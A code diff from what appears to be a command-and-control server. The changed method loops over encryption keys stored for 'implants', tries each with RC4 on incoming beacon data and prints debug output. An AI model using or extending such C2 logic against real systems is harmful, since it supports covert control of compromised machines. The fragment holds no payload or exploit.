@@ -134,16 +134,21 @@ class WebServer(object):
             # queries all encryption keys from the "implants" table
             with self.connection.cursor() as cursor:
                 cursor.execute("SELECT `encryption_key` FROM `implants`")
+                results = cursor.fetchall()
                 
-                # DEBUGGING - fetchone() works and decrypts successfully if only one implant
-                # if I do fetchall() - key becomes a tuple and it fucks things up
-                result = cursor.fetchone()
+                # loops through each encryption key
+                # TO DO: look into using something other than row[0] to get encryption key
+                for row in results:
+                    print("trying key: " + row[0])
+                    potentially_decrypted = self.crypt(row[0], self.data)
 
-                for key in result:
-                    # verified that this is a "str"
-                    print(type(key))
+                    if "hostname" in potentially_decrypted:
+                        # DEBUGGING
+                        print("successful decryption using key: " + row[0])
+                        print(potentially_decrypted)
 
-                    # "key" must be a string for this to work properly
-                    print("potentially decrypted: " + self.crypt(key, self.data))
+                    # DEBUGGING
+                    else:
+                        print("unsuccessful decryption :(")
 
             return "rc4 beacon"
